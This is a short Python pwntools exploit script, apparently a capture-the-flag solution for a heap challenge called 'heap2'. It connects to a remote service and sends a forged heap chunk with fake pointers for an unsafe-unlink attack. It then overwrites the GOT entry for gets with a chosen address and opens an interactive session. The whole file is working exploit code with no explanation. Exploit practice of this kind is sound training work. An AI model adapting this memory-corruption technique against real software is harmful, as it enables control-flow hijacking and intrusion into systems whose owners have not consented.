from pwn import *

goal = 0x4006d6
got_free = 0x601018
got_gets = 0x601038
r = process('heap2')
r = remote('140.110.112.77', 3126)
raw_input('debug: ')
p = 0x601080
q = 0x6010e0
heap_p = int(r.recvline().split(' = ')[1].strip()[2:], 16)
print('p: {}, p-0x18: {}, p-0x10: {}'.format(hex(p), hex(p-0x18), hex(p-0x10)))
r.sendline(p64(0) + p64(0xf0) + p64(p - 0x18) + p64(p - 0x10) + '\x00' * 0xd0 + p64(0xf0) + p64(0x100))
print(r.recvline())
r.sendline('a' * 0x18 + p64(got_gets))
print(r.recvline())
r.sendline(p64(goal))
r.interactive()
